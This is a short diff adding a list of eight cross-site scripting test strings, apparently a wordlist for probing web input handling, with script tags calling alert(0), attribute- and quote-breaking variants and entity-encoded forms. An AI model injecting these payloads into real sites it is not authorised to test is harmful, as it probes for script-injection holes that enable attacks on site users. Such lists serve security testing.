@@ -1,0 +1,9 @@
+"><script>"
+<script>alert(0)</script>
+<<script>alert(0)</script>
+'><script>alert(0)</script>'
+'><script>alert(0);</script>'
+\";alert(0);//
+&ltscript&gtalert(0);</script>
+&ltscript&gtalert(0)</script>
+
